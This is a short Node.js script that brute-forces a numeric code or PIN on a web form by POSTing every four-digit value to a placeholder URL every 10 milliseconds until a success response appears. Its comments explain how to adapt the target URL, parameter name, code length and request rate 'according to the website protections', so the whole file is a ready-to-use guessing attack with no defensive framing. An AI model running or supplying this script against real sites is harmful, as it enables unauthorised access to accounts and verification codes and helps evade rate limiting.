import fetch from 'node-fetch';

const getPassword = async (code) => {

    const params = new URLSearchParams();
    params.append('code', code); // Change the name of the code parameter 
    
    const response = await fetch('YOUR_URL_HERE', {method: 'POST', body: params}); //Change the URL
    const data = await response.json();

    return data
}

let i = "0000"; //Change according to number of caracters/digits in code

const interval = setInterval(() => {
    getPassword(i).then((result) => {
        console.log(result, i);
        
        if (result.success) { //Change according to the code response type
            console.log('Password found: ' + result);
            clearInterval(interval);
            process.exit(0);
        }
    });
    i = (parseInt(i) + 1).toString().padStart(4, '0'); //Change the value 4 to any amount of digits there could be
}, 10); //One request every 10 ms, change that according to the website protections
